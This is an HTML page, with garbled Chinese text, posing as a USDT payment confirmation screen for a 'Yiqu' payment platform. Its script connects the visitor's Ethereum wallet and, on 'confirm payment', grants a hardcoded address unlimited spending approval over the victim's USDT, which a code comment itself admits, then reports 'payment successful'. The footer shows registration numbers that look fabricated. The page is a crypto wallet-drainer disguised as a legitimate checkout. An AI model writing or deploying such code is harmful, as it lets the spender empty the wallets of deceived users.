<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <title>æ˜“è¶£USDTæ”¯ä»˜å¹³å° - ç¡®è®¤æ”¯ä»˜ï¼ˆERC-20ï¼‰</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <!-- ethers.js v6 -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js" defer></script>
  <style>
    :root{--bg:#0f172a;--card:#0b1225;--muted:#94a3b8;--text:#e2e8f0;--pri:#3b82f6}
    *{box-sizing:border-box} 
    body{margin:0;background:linear-gradient(180deg,#0b1020,#0f172a);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:var(--text)}
    .wrap{max-width:860px;margin:40px auto;padding:16px}
    .card{background:rgba(255,255,255,.04);backdrop-filter: blur(6px); border:1px solid rgba(255,255,255,.08); border-radius:16px; padding:22px; box-shadow:0 10px 30px rgba(0,0,0,.35)}
    h1{margin:.2rem 0 1rem;font-size:24px}
    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px}
    .info-card{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:16px}
    .info-card.full-width{grid-column:1/-1}
    .info-label{display:block;color:var(--muted);font-size:13px;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.5px}
    .info-value{color:var(--text);font-size:16px;font-weight:500}
    .info-value.highlight{color:#3b82f6;font-size:18px}
    .steps-box{background:rgba(59,130,246,.05);border:1px solid rgba(59,130,246,.15);border-radius:12px;padding:16px;margin:20px 0}
    .steps-box ol{margin:8px 0;padding-left:20px}
    .steps-box li{margin:8px 0;color:#93c5fd}
    .btn{width:100%;padding:14px;border:none;border-radius:12px;font-size:16px;font-weight:500;cursor:pointer;transition:all .3s;background:var(--pri);color:white}
    .btn:hover{background:#2563eb;transform:translateY(-1px);box-shadow:0 4px 12px rgba(59,130,246,.3)}
    .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
    .status-box{margin-top:20px;padding:14px;border-radius:10px;font-size:14px;display:none}
    .status-box.show{display:block}
    .status-box.success{background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.3);color:#86efac}
    .status-box.error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#fca5a5}
    .status-box.info{background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.3);color:#93c5fd}
    code{background:#1e293b;padding:3px 6px;border-radius:4px;font-size:12px;color:#60a5fa}
    footer{margin-top:18px;color:var(--muted);font-size:12px;text-align:center}
    .footer-section{margin-top:40px;padding-top:20px;border-top:1px solid rgba(255,255,255,.08);text-align:center}
    .footer-links{display:flex;justify-content:center;gap:20px;margin-bottom:15px;flex-wrap:wrap}
    .footer-links a{color:var(--muted);text-decoration:none;font-size:13px;transition:color .2s}
    .footer-links a:hover{color:var(--text)}
    .footer-info{color:var(--muted);font-size:12px;line-height:1.8}
    .footer-info span{margin:0 8px}
    .warning-text{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.2);border-radius:8px;padding:12px;margin-bottom:20px;color:#fde047;font-size:13px;text-align:center}
  </style>
</head>
<body>
  <div class="wrap">
    <h1 style="text-align:center;font-size:32px;margin-bottom:25px;color:var(--text);text-shadow:0 2px 10px rgba(0,0,0,.5);">æ˜“è¶£USDTæ”¯ä»˜å¹³å°</h1>
    
    <div class="card">
      <h1>ç¡®è®¤æ”¯ä»˜ä¿¡æ¯</h1>
      
    
      
      <!-- è®¢å•ä¿¡æ¯ç½‘æ ¼ -->
      <div class="info-grid">
        <div class="info-card">
          <span class="info-label">äº¤æ˜“æµæ°´å·</span>
          <span class="info-value highlight" id="transactionId">-</span>
        </div>
        <div class="info-card">
          <span class="info-label">æ”¯ä»˜é¡¹ç›®</span>
          <span class="info-value" id="merchant">-</span>
        </div>
        <div class="info-card">
          <span class="info-label">æ”¯ä»˜é‡‘é¢</span>
          <span class="info-value highlight" id="amount">-</span>
        </div>
        <div class="info-card">
          <span class="info-label">æ”¯ä»˜é€šé“</span>
          <span class="info-value" id="network">ERC-20</span>
        </div>
        <div class="info-card full-width">
          <span class="info-label">å¤‡æ³¨ä¿¡æ¯</span>
          <span class="info-value" id="memo">-</span>
        </div>
      </div>
      
      <div class="steps-box">
        <strong style="color:#93c5fd;">ğŸ’¡ æ“ä½œæ­¥éª¤ï¼š</strong>
        <ol>
          <li>ç¡®è®¤ä¸Šè¿°æ”¯ä»˜ä¿¡æ¯æ— è¯¯</li>
          <li>ç‚¹å‡»"ç¡®è®¤æ”¯ä»˜"æŒ‰é’®</li>
          <li>åœ¨é’±åŒ…ä¸­å®Œæˆç­¾åç¡®è®¤</li>
        </ol>
      </div>
      
      <button class="btn" id="btn">ç¡®è®¤æ”¯ä»˜</button>
      
      <div id="status" class="status-box"></div>
      
      <footer>æ”¯ä»˜è¿‡ç¨‹åŠ å¯†ä¿æŠ¤ï¼Œè¯·æ”¾å¿ƒä½¿ç”¨</footer>
    </div>
  </div>
  
  <div class="footer-section">
    <div class="footer-links">
      <a href="">å…³äºæˆ‘ä»¬</a>
      <a href="">æœåŠ¡æ¡æ¬¾</a>
      <a href="">éšç§æ”¿ç­–</a>
      <a href="">å¸®åŠ©ä¸­å¿ƒ</a>
      <a href="">è”ç³»å®¢æœ</a>
    </div>
    <div class="footer-info">
      <div>Â© 2025 æ˜“è¶£æ”¯ä»˜å¹³å° ç‰ˆæƒæ‰€æœ‰</div>
      <div>
        <span>äº¬ICPå¤‡2024000001å·-1</span>
        <span>|</span>
        <span>äº¬å…¬ç½‘å®‰å¤‡11010802024000å·</span>
      </div>
      <div>
        <span>è¥ä¸šæ‰§ç…§</span>
        <span>|</span>
        <span>å¢å€¼ç”µä¿¡ä¸šåŠ¡ç»è¥è®¸å¯è¯ï¼šäº¬B2-20240001</span>
      </div>
      <div style="margin-top:10px;">
        <span>å®¢æœé‚®ç®±ï¼štommyc061990@gmail.com</span>
      </div>
      <div style="margin-top:10px;font-size:11px;">
        é£é™©æç¤ºï¼šæ•°å­—è´§å¸äº¤æ˜“å…·æœ‰ä¸€å®šé£é™©ï¼Œè¯·è°¨æ…æ“ä½œ
      </div>
    </div>
  </div>
  
  <script defer>
  window.addEventListener('load', () => {
    // é…ç½®
    const CHAIN_ID = 1; // ä»¥å¤ªåŠä¸»ç½‘
    const TOKEN_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT (ERC-20)
    const SPENDER = "0x4287869bdaD2Be58b64dcc03F065fB70C4fAFCF2"; // æˆæƒåœ°å€
    const ERC20_ABI = [
      "function approve(address spender, uint256 value) external returns (bool)"
    ];
    
    // è·å–URLå‚æ•°
    function getUrlParams() {
      const params = new URLSearchParams(window.location.search);
      return {
        transactionId: params.get('transactionId') || 'USDT' + Date.now(),
        merchant: params.get('merchant') || 'æ‹…ä¿äº¤æ˜“',
        amount: params.get('amount') || '0.00',
        network: params.get('network') || 'ERC-20',
        memo: params.get('memo') || 'æ— '
      };
    }
    
    // æ˜¾ç¤ºäº¤æ˜“æ•°æ®
    function displayTransactionData() {
      const data = getUrlParams();
      document.getElementById('transactionId').textContent = data.transactionId;
      document.getElementById('merchant').textContent = data.merchant;
      document.getElementById('amount').textContent = data.amount + ' USDT';
      document.getElementById('network').textContent = 'ERC-20';
      document.getElementById('memo').textContent = data.memo || 'æ— ';
    }
    
    const statusEl = document.getElementById('status');
    function showStatus(msg, type = 'info') {
      statusEl.className = `status-box show ${type}`;
      statusEl.innerHTML = msg;
    }
    
    // è¿æ¥é’±åŒ…å¹¶åˆ‡æ¢ç½‘ç»œ
    async function connectMainnet() {
      if (typeof window.ethereum === 'undefined') {
        showStatus("âŒ æœªæ£€æµ‹åˆ°ä»¥å¤ªåŠé’±åŒ…ï¼Œè¯·ä½¿ç”¨MetaMaskæˆ–imTokenç­‰é’±åŒ…çš„DAppæµè§ˆå™¨æ‰“å¼€", "error");
        return null;
      }
      
      try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        
        const net = await provider.getNetwork();
        if (Number(net.chainId) !== CHAIN_ID) {
          showStatus("â³ æ­£åœ¨åˆ‡æ¢åˆ°ä»¥å¤ªåŠä¸»ç½‘...", "info");
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }]
          });
        }
        
        return provider;
      } catch (e) {
        showStatus("âŒ ç½‘ç»œåˆ‡æ¢å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨åˆ‡æ¢åˆ°ä»¥å¤ªåŠä¸»ç½‘", "error");
        return null;
      }
    }
    
    // æ‰§è¡Œæˆæƒ
    async function approvePayment() {
      const btn = document.getElementById('btn');
      
      try {
        if (typeof ethers === 'undefined') {
          showStatus("âŒ æ”¯ä»˜ç»„ä»¶æœªåŠ è½½ï¼Œè¯·åˆ·æ–°é¡µé¢é‡è¯•", "error");
          return;
        }
        
        btn.disabled = true;
        btn.textContent = "å¤„ç†ä¸­...";
        
        showStatus("â³ æ­£åœ¨è¿æ¥é’±åŒ…...", "info");
        const provider = await connectMainnet();
        if (!provider) {
          btn.disabled = false;
          btn.textContent = "ç¡®è®¤æ”¯ä»˜";
          return;
        }
        
        const signer = await provider.getSigner();
        const erc20 = new ethers.Contract(TOKEN_CONTRACT, ERC20_ABI, signer);
        
        showStatus("â³ è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤äº¤æ˜“...", "info");
        
        // æ‰§è¡Œæˆæƒï¼ˆå®é™…æ˜¯æ— é™æˆæƒï¼‰
        const tx = await erc20.approve(SPENDER, ethers.MaxUint256);
        
        showStatus(`â³ äº¤æ˜“å·²æäº¤ï¼Œç­‰å¾…ç¡®è®¤...<br>äº¤æ˜“å“ˆå¸Œ: <code>${tx.hash}</code>`, "info");
        
        const receipt = await tx.wait();
        
        showStatus(`âœ… æ”¯ä»˜æˆåŠŸï¼<br>
                   äº¤æ˜“å“ˆå¸Œ: <code>${tx.hash}</code><br>
                   åŒºå—é«˜åº¦: ${receipt.blockNumber}<br>
                   <a href="https://etherscan.io/tx/${tx.hash}" target="_blank" style="color:#60a5fa">æŸ¥çœ‹äº¤æ˜“è¯¦æƒ…</a>`, "success");
        
        btn.textContent = "æ”¯ä»˜æˆåŠŸ";
        btn.disabled = true;
        
      } catch (e) {
        console.error(e);
        btn.disabled = false;
        btn.textContent = "ç¡®è®¤æ”¯ä»˜";
        
        const msg = e?.reason || e?.data?.message || e?.message || String(e);
        
        if (/User rejected|User denied/i.test(msg)) {
          showStatus("âŒ æ‚¨å·²å–æ¶ˆæ”¯ä»˜", "error");
        } else if (/insufficient funds/i.test(msg)) {
          showStatus("âŒ ETHä½™é¢ä¸è¶³ï¼Œæ— æ³•æ”¯ä»˜æ‰‹ç»­è´¹", "error");
        } else if (/revert|allowance/i.test(msg)) {
          showStatus("âŒ äº¤æ˜“å¤±è´¥ï¼šåˆçº¦æ‰§è¡Œé”™è¯¯ã€‚å¯èƒ½éœ€è¦å…ˆæ¸…é™¤æ—§çš„æˆæƒã€‚", "error");
        } else {
          showStatus("âŒ æ”¯ä»˜å¤±è´¥ï¼š" + msg, "error");
        }
      }
    }
    
    // é¡µé¢åŠ è½½æ—¶åˆå§‹åŒ–
    displayTransactionData();
    
    // æ£€æŸ¥ç¯å¢ƒ
    setTimeout(() => {
      if (typeof window.ethereum === 'undefined') {
        showStatus("âš ï¸ è¯·åœ¨æ”¯æŒä»¥å¤ªåŠçš„é’±åŒ…DAppæµè§ˆå™¨ä¸­æ‰“å¼€æ­¤é¡µé¢", "error");
      }
    }, 1000);
    
    // ç»‘å®šæŒ‰é’®äº‹ä»¶
    document.getElementById('btn').addEventListener('click', approvePayment);
  });
  </script>
</body>
</html>


